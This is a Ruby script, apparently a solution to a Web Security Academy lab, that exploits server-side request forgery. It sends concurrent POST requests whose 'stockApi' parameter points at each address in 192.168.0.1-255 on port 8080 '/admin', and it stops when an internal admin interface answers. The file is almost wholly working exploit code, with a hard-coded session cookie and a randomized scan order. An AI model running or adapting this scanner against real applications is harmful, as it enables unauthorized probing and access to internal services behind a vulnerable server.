require 'bundler/inline'

gemfile do
  source 'https://rubygems.org'
  gem 'async-http'
end

require 'async'
require 'async/semaphore'
require 'async/barrier'
require 'async/http/internet'

class RangeBruteforcer
  def initialize(from:, to:)
    @from = from
    @to = to
    @first_pick = rand(from..to-1)
    @current = @first_pick
    @finished = false
  end

  # An iterator that follows the `Linear Congruential Generator` algorithm.
  # For more information: https://en.wikipedia.org/wiki/Linear_congruential_generator
  def each(&block)
    loop do
      block.call(@current)

      @current = (@current + step) % @to
      break if @current == @first_pick || finished?
    end
  end

  def finish!
    @finished = true
  end

  private

  def step
    @step ||= pick_random_coprime(@to);
  end

  def finished?
    @finished
  end

  # The probability that two random integers are coprime to one another
  # works out to be around 61%, given that we can safely pick a random
  # number and test it. Just in case we are having a bad day and we cannot
  # pick a coprime number after 10 tries we just return "end - 1" which
  # is guaranteed to be a coprime, but won't provide ideal randomization.
  #
  # We pick between "lower_range" and "upper_range" since values too close to
  # the boundaries, which in these case are the "start" and "end" arguments
  # would also provide non-ideal randomization as discussed on the paragraph
  # above.
  def pick_random_coprime(max)
    range_boundary = max / 4;
    lower_range = range_boundary;
    upper_range = max - range_boundary;
    candidate = rand(lower_range..upper_range);

    (0..10).each do |_|
      if max.gcd(candidate) == 1
        return candidate;
      else
        candidate = rand(lower_range..upper_range);
      end
    end

    max - 1
  end
end

class Connection
  def initialize(internet, url, headers)
    @internet = internet
    @url = url
    @headers = headers
  end

  def perform(body)
    @internet.post(@url, @headers, body)
  end
end

Async do |bruteforce_task|
	internet = Async::HTTP::Internet.new
	semaphore = Async::Semaphore.new(4)
	barrier = Async::Barrier.new(parent: semaphore)

  url = 'https://ac3d1f181e4bac8680420dfd006f0081.web-security-academy.net/product/stock'
  headers = [
    ['Accept', '*/*'],
    ['Accept-Encoding', 'gzip, deflate, br'],
    ['Cache-Control', 'no-cache'],
    ['Cookie', 'session=RYo3mB8ni7L4Vyji38JrJWFlnRhKs7S1'],
    ['Content-Type', 'application/x-www-form-urlencoded'],
  ]
  connection = Connection.new(internet, url, headers)
  brute_forcer = RangeBruteforcer.new(from: 1, to: 255)

  brute_forcer.each do |ip|
    barrier.async do
      body = "stockApi=http%3A%2F%2F192.168.0.#{ip}%3A8080/admin"
      response = connection.perform(body)

      if response.status == 200
        puts "\n\nFound: #{body}\n\n"
        brute_forcer.finish!
      else
        print '.'
      end

      response&.close
    end
  end

  barrier.wait
ensure
	internet&.close
end
